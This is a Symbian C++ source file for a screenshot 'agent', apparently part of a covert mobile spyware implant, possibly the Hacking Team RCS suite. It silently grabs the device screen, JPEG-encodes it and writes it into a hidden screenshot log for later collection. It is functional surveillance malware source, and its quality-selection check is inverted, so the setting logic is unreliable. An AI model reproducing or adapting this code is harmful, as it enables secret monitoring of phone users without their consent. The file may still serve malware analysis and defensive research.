/*
 * AgentScreenshot.cpp
 *
 *  Created on: 05/ago/2010
 *      Author: 
 */

#include <FBS.H>
#include <ICL\ImageData.h>
#include <ICL\ImageCodecData.h>
#include <ImageConversion.h>
#include <gdi.h>
#include <COEMAIN.H>
#include "AgentScreenshot.h"
#include "Json.h"
#include <HT\Logfile.h>

CAgentScreenshot::CAgentScreenshot() :
	CAbstractAgent(EAgent_Screenshot),iBusy(EFalse)
	{
	// No implementation required
	}

CAgentScreenshot::~CAgentScreenshot()
	{
	delete iScreenDevice;
	delete iBitmap;
	iWsSession.Close();
	}

CAgentScreenshot* CAgentScreenshot::NewLC(const TDesC8& params)
	{
	CAgentScreenshot* self = new (ELeave) CAgentScreenshot();
	CleanupStack::PushL(self);
	self->ConstructL(params);
	return self;
	}

CAgentScreenshot* CAgentScreenshot::NewL(const TDesC8& params)
	{
	CAgentScreenshot* self = CAgentScreenshot::NewLC(params);
	CleanupStack::Pop();
	return self;
	}

void CAgentScreenshot::ConstructL(const TDesC8& aParams)
	{
	BaseConstructL(aParams);
	
	//read parameters
	RBuf paramsBuf;
				
	TInt err = paramsBuf.Create(2*aParams.Size());
	if(err == KErrNone)
		{
		paramsBuf.Copy(aParams);
		}
	else
		{
		//TODO: not enough memory
		}
			
	paramsBuf.CleanupClosePushL();
	CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
	CleanupStack::PushL(jsonBuilder);
	jsonBuilder->BuildFromJsonStringL(paramsBuf);
	CJsonObject* rootObject;
	jsonBuilder->GetDocumentObject(rootObject);
	if(rootObject)
		{
		CleanupStack::PushL(rootObject);
		//get image quality
		TBuf<8> qualityBuf;
		rootObject->GetStringL(_L("quality"),qualityBuf);
		if(qualityBuf.Compare(_L("hi")))
			{
			iQuality = 100;
			}
		else if(qualityBuf.Compare(_L("med")))
			{
			iQuality = 90;
			}
		else
			{
			iQuality = 80;
			}
		CleanupStack::PopAndDestroy(rootObject);
		}
	CleanupStack::PopAndDestroy(jsonBuilder);
	CleanupStack::PopAndDestroy(&paramsBuf);

	iWsSession.Connect();
	iScreenDevice = new(ELeave) CWsScreenDevice(iWsSession);
	iScreenDevice->Construct();
	}

void CAgentScreenshot::StartAgentCmdL()
	{
	if(iBusy)
		return;
	
	iBusy = ETrue;
	
	DoCaptureL();
		
	RBuf8 buf(GetImageBufferL());
	buf.CleanupClosePushL();
	if (buf.Length() > 0)
		{
		TInt value;
		RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
		if(value)
			{
			TScreenshotAdditionalData additionalData;
		
			CLogFile* logFile = CLogFile::NewLC(iFs); 
			logFile->CreateLogL(LOGTYPE_SCREENSHOT, &additionalData);
			logFile->AppendLogL(buf);
			logFile->CloseLogL();
			CleanupStack::PopAndDestroy(logFile);
			}
		}
	CleanupStack::PopAndDestroy(&buf);
	iBusy = EFalse;
	}

void CAgentScreenshot::StopAgentCmdL()
	{
	}

void CAgentScreenshot::CycleAgentCmdL()
	{
	//nothing to be done this is not an appending agent
	}

void CAgentScreenshot::DoCaptureL()
    {
	TPixelsTwipsAndRotation sizeAndRotation;
	iScreenDevice->GetScreenModeSizeAndRotation(iScreenDevice->CurrentScreenMode(), sizeAndRotation);

	delete iBitmap;
	iBitmap = 0;
	iBitmap = new (ELeave) CFbsBitmap();
	iBitmap->Create(sizeAndRotation.iPixelSize, iScreenDevice->DisplayMode());
	iBitmap->SetSizeInTwips(iScreenDevice);
	TInt err = iScreenDevice->CopyScreenToBitmap(iBitmap);
	if (err == KErrNone)
		iCapturedScreen = ETrue;
	}

HBufC8* CAgentScreenshot::GetImageBufferL()
	{
	if (!iCapturedScreen)
		return HBufC8::NewL(0); 

	CFrameImageData* frameImageData = CFrameImageData::NewL();
	CleanupStack::PushL(frameImageData);
	TJpegImageData* imageData = new (ELeave) TJpegImageData();
	imageData->iSampleScheme  = TJpegImageData::EColor444;
	imageData->iQualityFactor = iQuality; // 80= low, set 90 for normal or 100 for high 
	frameImageData->AppendImageData(imageData);
				
	HBufC8* imageBuf = NULL;
	CImageEncoder* iencoder  = CImageEncoder::DataNewL(imageBuf,_L8("image/jpeg"),CImageEncoder::EOptionAlwaysThread);
	CleanupStack::PushL(iencoder);
	TRequestStatus aStatus = KErrNone; 
	iencoder->Convert( &aStatus, *iBitmap, frameImageData );
	User::WaitForRequest( aStatus );
	CleanupStack::PopAndDestroy(iencoder);
				
	CleanupStack::PopAndDestroy(frameImageData);

	// this is just to be sure: if iWsSession is closed before iBitmap is deleted, a panic FBSLIB reason 2 is raised!
	delete iBitmap;
	iBitmap = NULL;
	
	return imageBuf;
	}

